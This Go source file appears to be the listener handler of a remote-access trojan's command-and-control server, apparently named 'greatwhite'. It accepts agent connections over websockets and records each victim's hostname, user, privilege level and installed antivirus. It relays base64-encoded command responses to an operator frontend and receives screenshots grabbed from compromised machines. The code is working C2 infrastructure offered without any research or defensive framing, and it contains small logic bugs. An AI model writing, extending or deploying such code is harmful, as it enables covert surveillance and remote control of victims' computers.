package handlers

import (
	"fmt"
	"log"
	"net/http"
	"strconv"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/gopher-socket/transport"
	"github.com/whiterabb17/greatwhite/modules/models"
	"github.com/whiterabb17/greatwhite/modules/util"
)

var (
	AdminServer  *gophersocket.Server
	AdminChannel *gophersocket.Channel
	Server       *gophersocket.Server
	client       *gophersocket.Channel
	agents       map[string]*gophersocket.Channel
	PortMap      map[string]int
	NodeFarm     []*Node
)

type Node struct {
	Name   string
	Port   int
	Server *gophersocket.Server
}

func AddNode(name string, port int, server *gophersocket.Server) bool {
	for _, node := range NodeFarm {
		if node.Name == name {
			return false
		} else {
			NodeFarm = append(NodeFarm, NewNode(name, port, server))
			return true
		}
	}
	return false
}

func NewNode(name string, port int, server *gophersocket.Server) *Node {
	conf := &Node{
		Name:   name,
		Port:   port,
		Server: server,
	}
	return conf
}

// MessageHandler is a functions that handles messages
func StartListeningServer(name string, port int) {
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	//l.Server = server
	//AddToPortMap(port, true)
	if !AddNode(name, port, server) {
		AdminChannel.Emit("listenerError", models.Packet{Event: "NewListener", Message: "Unable to create listener, name or port are occupied"})
	}
	serveMux := http.NewServeMux()
	serveMux.Handle("/socket.io/", server)
	server.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
		//client id is unique
		log.Println("New client connected, client id is ", c.Id())
		SendToFrontend(client, "alert", "New client connected, client id is "+c.Id())
	})
	server.On("register", func(c *gophersocket.Channel, info models.ClientInfo) {
		cinfo := models.ClientInfo{
			SocketID:  c.Id(),
			Priv:      info.Priv,
			Version:   info.Version,
			IPAddr:    info.IPAddr,
			Hostname:  info.Hostname,
			User:      info.User,
			OS:        info.OS,
			Arch:      info.Arch,
			CPU:       info.CPU,
			GPU:       info.GPU,
			Memory:    info.Memory,
			AntiVirus: info.AntiVirus,
		}
		models.ClientList = append(models.ClientList, cinfo)
		toSend := fmt.Sprintf("%s#%s#Golang", info.SocketID, info.OS)
		log.Println(toSend)
		log.Println(cinfo)
		SendToFrontend(client, "newClient", toSend)
		client.Emit("register", cinfo)
	})
	//on disconnection handler, if client hangs connection unexpectedly, it will still occurs
	//you can omit function args if you do not need them
	//you can return string value for ack, or return nothing for emit
	server.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel) {
		var _clientList []models.ClientInfo
		var discon string
		for _, s := range models.ClientList {
			if s.SocketID != c.Id() {
				_clientList = append(_clientList, s)
			} else {
				discon = s.SocketID
			}
		}
		models.ClientList = _clientList
		_clientList = nil
		log.Println("Client Disconnected, client id is ", c.Id())
		SendToFrontend(client, "alert", "[<i>!</i>] Client <b>"+discon+"</b> Disconnected")
		SendToFrontend(client, "discon", discon)
	})
	//error catching handler
	server.On(gophersocket.OnError, func(c *gophersocket.Channel) {
		log.Println("Error from " + c.Id())
		SendToFrontend(client, "svrerror", "Error from: "+c.Id())
	})
	server.On("repl", func(c *gophersocket.Channel, resp models.Resp) {
		var response string
		var err error
		var tag string
		response, err = util.Fb64(resp.Resp)
		if err != nil {
			response = resp.Resp
		}
		tag, err = util.Fb64(resp.Tag)
		if err != nil {
			response = resp.Tag
		}
		log.Println(resp)
		SendToFrontend(client, "response", tag+"::"+fmt.Sprintf("Reponse: <i>%s</i>", response))
	})
	server.On("error", func(c *gophersocket.Channel, resp models.Resp) {
		var response, tag string
		var err error
		response, err = util.Fb64(resp.Resp)
		if err != nil {
			response = resp.Resp
		}
		tag, err = util.Fb64(resp.Tag)
		if err != nil {
			response = resp.Tag
		}
		log.Println(resp)
		SendToFrontend(client, "error", tag+"::"+(fmt.Sprintf("<u>Error Encountered</u>\nReponse: <i>%s</i>", response)))
	})
	server.On("screenshotData", func(c *gophersocket.Channel, letter models.Mail) {
		item, er := util.SSf64(letter.Buffer, letter.Uid)
		if er != nil {
			log.Println(er)
		}
		SendToFrontend(client, "screengrab", item)

	})
	log.Println(http.ListenAndServe(":"+strconv.Itoa(port), serveMux))
}

func SendToFrontend(cl *gophersocket.Channel, eventMsg, msg string) {
	cl.Emit(eventMsg, msg)
}

func GetChannelByTag(tag string) *gophersocket.Channel {
	for k, _ := range agents {
		if k == tag {
			return agents[tag]
		}
	}
	return nil
}

func AddToAgentMap(channel *gophersocket.Channel) {
	tag := channel.Id()
	_, found := agents[tag]
	if !found {
		agents[tag] = channel
	}
}

func RemoveFromAgentMap(cha *gophersocket.Channel) {
	for key, value := range agents {
		if value == cha {
			delete(agents, key)
		}
	}
}
